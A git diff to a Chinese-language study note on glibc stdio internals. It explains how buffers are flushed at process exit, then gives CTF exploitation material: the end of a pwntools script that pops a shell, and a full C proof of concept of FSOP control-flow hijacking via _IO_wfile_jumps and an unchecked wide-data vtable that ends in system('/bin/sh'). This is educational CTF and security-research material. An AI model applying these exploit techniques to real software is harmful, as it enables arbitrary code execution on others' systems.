@@ -464,7 +464,65 @@ Found FILE * at 0x7f64e53f86a0, fd is 1
 Found FILE * at 0x7f64e53f7980, fd is 0
 ```
 
+## 程序退出时 flush 缓冲区
+
+编程的时候，如果看不到 printf 打印的内容，可能是因为它的数据写入了缓冲区，但是因为程序没有正常退出，所以没有 flush 出来。那也就是说，如果程序正常退出，glibc 会自动进行 flush 操作。其机制是，libc 在结束进程前，会调用 `_IO_cleanup` 函数把缓冲区内的数据 flush 出去：
+
+```c
+text_set_element(__libc_atexit, _IO_cleanup);
+
+int
+_IO_cleanup (void)
+{
+  int result = _IO_flush_all_lockp (0);
+
+  /* omitted */
+
+  return result;
+}
+```
+
+它调用的 `_IO_flush_all_lockp` 函数会遍历 `_IO_list_all` 链表，检查它是否需要 flush：
+
+```c
+int
+_IO_flush_all_lockp (int do_lock)
+{
+  int result = 0;
+  FILE *fp;
+
+  /* omitted */
+
+  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp->_chain)
+    {
+      run_fp = fp;
+      if (do_lock)
+        _IO_flockfile (fp);
+
+      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
+           || (_IO_vtable_offset (fp) == 0
+               && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
+                                    > fp->_wide_data->_IO_write_base))
+           )
+          && _IO_OVERFLOW (fp, EOF) == EOF)
+        result = EOF;
+
+      if (do_lock)
+        _IO_funlockfile (fp);
+      run_fp = NULL;
+    }
+
+  /* omitted */
+
+  return result;
+}
+```
+
+这里的 `_IO_OVERFLOW` 函数会把缓冲区内的数据通过 write syscall 输出。
+
 ## CTF
+
+### 修改 `stdin->_IO_buf_base` 以实现任意地址写
 
 下面演示如何利用一个任意地址的两字节写，在一个可以操控的 getchar/scanf 调用且外加可控 size 的 malloc 的程序中实现 get shell：
 
@@ -605,3 +663,145 @@ p.sendline(p64(system))
 p.sendline(b"whoami && id")
 p.interactive()
 ```
+
+### 控制流挟持
+
+前面提到，libc 在结束进程前，会遍历 `_IO_list_all` 链表，每个 FILE 的缓冲区是否还有内容：如果检查 `fp->_IO_write_ptr > fp->_IO_write_base` 或者 `_IO_vtable_offset (fp) == 0 && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)` 成立，就说明还有数据没有通过 write syscall 写出去，这时候就会调用 overflow hook 函数来做这件事情。overflow hook 本身保存在 vtable 中，而 vtable 受到了保护，在 `IO_validate_vtable` 函数中检查它是否合法，即是否为 glibc 自带的 vtable，此时如果用自己构造的 vtable，就会出现 `Fatal error: glibc detected an invalid stdio handle` 错误。
+
+既然不能用 glibc 以外的 vtable，这时候可以利用 glibc 自带的另一个 vtable：`IO_wfile_jumps`，它的 `overflow` 函数指向了 `_IO_wfile_overflow`，而这个函数在一些条件下会调用 `_IO_wdoallocbuf` 进而调用 `_IO_WDOALLOCATE`，此时它会从 `_wide_data` 字段读取 vtable，这个 vtable 是没有检查的，所以可以攻击。演示代码如下：
+
+```c
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+#define JUMP_FIELD(TYPE, NAME) void *NAME
+
+struct _IO_jump_t {
+  JUMP_FIELD(size_t, __dummy);
+  JUMP_FIELD(size_t, __dummy2);
+  JUMP_FIELD(_IO_finish_t, __finish);
+  JUMP_FIELD(_IO_overflow_t, __overflow);
+  JUMP_FIELD(_IO_underflow_t, __underflow);
+  JUMP_FIELD(_IO_underflow_t, __uflow);
+  JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
+  /* showmany */
+  JUMP_FIELD(_IO_xsputn_t, __xsputn);
+  JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
+  JUMP_FIELD(_IO_seekoff_t, __seekoff);
+  JUMP_FIELD(_IO_seekpos_t, __seekpos);
+  JUMP_FIELD(_IO_setbuf_t, __setbuf);
+  JUMP_FIELD(_IO_sync_t, __sync);
+  JUMP_FIELD(_IO_doallocate_t, __doallocate);
+  JUMP_FIELD(_IO_read_t, __read);
+  JUMP_FIELD(_IO_write_t, __write);
+  JUMP_FIELD(_IO_seek_t, __seek);
+  JUMP_FIELD(_IO_close_t, __close);
+  JUMP_FIELD(_IO_stat_t, __stat);
+  JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
+  JUMP_FIELD(_IO_imbue_t, __imbue);
+};
+
+struct _IO_FILE_plus {
+  FILE file;
+  struct _IO_jump_t *vtable;
+};
+
+struct __gconv_step_data {
+  unsigned char *__outbuf;
+  unsigned char *__outbufend;
+  int __flags;
+  int __invocation_counter;
+  int __internal_use;
+  __mbstate_t *__statep;
+  __mbstate_t __state;
+};
+
+typedef struct {
+  struct __gconv_step *step;
+  struct __gconv_step_data step_data;
+} _IO_iconv_t;
+
+struct _IO_codecvt {
+  _IO_iconv_t __cd_in;
+  _IO_iconv_t __cd_out;
+};
+
+struct _IO_wide_data {
+  wchar_t *_IO_read_ptr;   /* Current read pointer */
+  wchar_t *_IO_read_end;   /* End of get area. */
+  wchar_t *_IO_read_base;  /* Start of putback+get area. */
+  wchar_t *_IO_write_base; /* Start of put area. */
+  wchar_t *_IO_write_ptr;  /* Current put pointer. */
+  wchar_t *_IO_write_end;  /* End of put area. */
+  wchar_t *_IO_buf_base;   /* Start of reserve area. */
+  wchar_t *_IO_buf_end;    /* End of reserve area. */
+  /* The following fields are used to support backing up and undo. */
+  wchar_t *_IO_save_base;   /* Pointer to start of non-current get area. */
+  wchar_t *_IO_backup_base; /* Pointer to first valid character of
+                               backup area */
+  wchar_t *_IO_save_end;    /* Pointer to end of non-current get area. */
+
+  __mbstate_t _IO_state;
+  __mbstate_t _IO_last_state;
+  struct _IO_codecvt _codecvt;
+
+  wchar_t _shortbuf[1];
+
+  const struct _IO_jump_t *_wide_vtable;
+};
+
+void get_shell() { system("/bin/sh"); }
+
+int main() {
+  // offset obtained by objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep
+  // _IO_2_1_stdin_
+  uint8_t *libc_base = (uint8_t *)stdin - 0x1ec980;
+
+  // offset obtained by objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep
+  // _IO_list_all
+  struct _IO_FILE_plus **list_all =
+      (struct _IO_FILE_plus **)(libc_base + 0x1ed5a0);
+
+  // create a fake FILE struct
+  struct _IO_FILE_plus *fake_file =
+      (struct _IO_FILE_plus *)malloc(sizeof(struct _IO_FILE_plus));
+
+  // we must satisfy the following conditions:
+  // 1. required in _IO_flush_all_lockp: (_mode <= 0 && _IO_write_ptr >
+  // _IO_write_base) || (_vtable_offset == 0 && _mode > 0 &&
+  // _wide_data->_IO_write_ptr > _wide_data->_IO_write_base)
+  // 2. required in _IO_wfile_overflow: (_flags & _IO_NO_WRITES) == 0 && (_flags
+  // & _IO_CURRENTLY_PUTTING) == 0 && _wide_data->_IO_write_base == 0
+  // 3. required in _IO_wdoallocbuf: _wide_data->_IO_buf_base == 0 && (flags &
+  // _IO_UNBUFFERED) == 0
+  fake_file->file._mode = 0;
+  fake_file->file._IO_write_ptr = (char *)1;
+  fake_file->file._IO_write_base = (char *)0;
+  fake_file->file._flags = 0;
+  fake_file->file._wide_data =
+      (struct _IO_wide_data *)malloc(sizeof(struct _IO_wide_data));
+  fake_file->file._wide_data->_IO_write_base = 0;
+  fake_file->file._wide_data->_IO_buf_base = 0;
+
+  // doallocate is called within _IO_wdoallocbuf
+  struct _IO_jump_t *wide_vtable = malloc(sizeof(struct _IO_jump_t));
+  wide_vtable->__doallocate = get_shell;
+  fake_file->file._wide_data->_wide_vtable = wide_vtable;
+
+  // use IO_wfile_jumps as vtable to pass vtable validation
+  fake_file->vtable = (struct _IO_jump_t *)(libc_base + 0x1e8f60);
+
+  *list_all = fake_file;
+
+  return 0;
+}
+```
+
+## 参考
+
+- [第七届“湖湘杯” House _OF _Emma | 设计思路与解析](https://www.anquanke.com/post/id/260614)
+- [Unexpected heap primitive and unintended solve - codegate quals 2025 writeup](https://rosayxy.github.io/codegate-quals-2025-writeup/)
+- [[原创] House of apple 一种新的glibc中IO攻击方法 (2)](https://bbs.kanxue.com/thread-273832.htm)
+- [Advanced Heap Exploitation: File Stream Oriented Programming](https://dangokyo.me/2018/01/01/advanced-heap-exploitation-file-stream-oriented-programming/)
+- [STACK the Flags CTF 2022](https://chovid99.github.io/posts/stack-the-flags-ctf-2022/)
